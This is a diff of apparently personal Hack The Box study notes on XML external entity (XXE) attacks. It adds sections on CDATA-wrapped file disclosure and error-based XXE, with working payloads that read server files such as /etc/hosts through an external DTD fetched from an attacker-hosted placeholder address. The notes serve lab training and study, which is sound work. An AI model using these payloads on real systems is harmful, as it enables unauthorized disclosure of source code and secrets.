@@ -9,6 +9,9 @@
     - [Reading Source Code](#reading-source-code)
     - [Remote Code Execution](#remote-code-execution)
     - [Other XXE Attacks](#other-xxe-attacks)
+  - [Advanced File Disclosure](#advanced-file-disclosure)
+    - [... with CDATA](#-with-cdata)
+    - [Error Based XXE](#error-based-xxe)
 
 ---
 
@@ -253,3 +256,92 @@ Finally, one common use of XXE attacks is causing a DOS to the hosting web serve
 ```
 
 This payload defines the ```a0``` entity as ```DOS```, reference it in ```a1``` multiple times, references ```a1``` in ```a2```, and so on until the back-end server's memory runs out due to self-reference loops. However, this attack no longer works with modern web servers, as they protect against entity self-reference.
+
+## Advanced File Disclosure
+
+### ... with CDATA
+
+To output data that does not conform to the XML format, you can wrap the content of the external file reference with a ```CDATA``` (e. g. ```<![CDATA[ FILE_CONTENT ]]>```). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special chars.
+
+One easy way to tackle this issue would be to define a ```begin``` internal entity with ```<![DATA[```, and an ```end``` internal entity with ```]]>```, and then place your external entity file in between, and it should be considered as a ```CDATA``` element:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+
+After that, if you reference the ```&joined;``` entity, it should contain your escaped data. However, this will not work, since XML prevents joining internal and external entities, so you will have to find a better way to do so.
+
+Ty bypass this limitation, you can utilize XML Parameter Entities, a special type of entity that starts with a ```%``` char and can only be used within the DTD. What's unique about parameter entities is that if you reference them from an external source, then all of them would be considered as external and can be joined.
+
+```xml
+<!ENTITY joined "%begin;%file;%end;">
+```
+
+Trying to tead the ```submitDetails.php``` file by first storing the line in a DTD file, host it on your machine, and then reference it as an external entity on the target web app:
+
+```bash
+d41y@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+d41y@htb[/htb]$ python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Now, you can reference your external body entity and then print the ```&joined;``` entity you defined above, which should contain the content of the ```submitDetails.php``` file:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+
+Once you write your ```xxe.dtd``` file, host it on your machine, and then add the above lines to your HTTP request to the vulnerable web app, you can finally get the content of the ```submitDetails.php``` file:
+
+![xxe 7](../../../../images/xxe_7.png)
+
+As you can see, you were able to obtain the file's source code without needing to encode it to base64, which saves a lot of time when going through various files to look for secrets and passwords.
+
+### Error Based XXE
+
+Another situation you may find yourself in is one where the web app might not write any output, so you cannot control any of the XML input entities to write its content. In such cases, you would be blind to the XML output and so would not be able to retrieve the file content using your usual methods.
+
+If the web app displays runtime errors and does not have proper exception handling for the XML input, then you can use this flaw to read the output of the XXE exploit. If the web app neither writes XML output nor displays any errors, you would face a completely blind situation.
+
+Consider the scenario in which none of the XML input entities is displayed to the screen. Because of this, you may have no entity that you can control to write the file output. First, let's try to send malformed XML data, and see if the web app displays any errors. To do so, you can delete any of the closing tags, change one of them, so it does not close, or just reference a non-existing entity:
+
+![xxe 8](../../../../images/xxe_8.png)
+
+You see that you did indeed cause the web app to display an error, and it also revealed the web server directory, which you can use to read the source code of other files. Now, you can exploit this flaw to exfiltrate file content. To do so, you will use a similar technique to what you used earlier. First, you will host a DTD file that contains the following payload:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+
+The above payload defines the ```file``` parameter entity and then joins it with an entity that does not exist. In your previous exercise, you were joining three strings. In this case, ```%nonExistingEntity;``` does not exist, so the web application would throw an error saying that this entity does not exist, along with your joined ```%file;``` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad chars in the referenced file.
+
+Now, you can call your external DTD script, and then reference the ```error``` entity:
+
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
+Once you host your DTD script as you did earlier and send the above payload as your XML data, you will get the content of the ```/etc/hosts``` file:
+
+![xxe 9](../../../../images/xxe_9.png)
+
+This method may also be used to read the source code of files. All you have to do is change the file name in your DTD script to point to the file you want to read. However, this method is not as reliable as the previous method for reading source files, as it may have length limitations, and certain special characters may still break it.
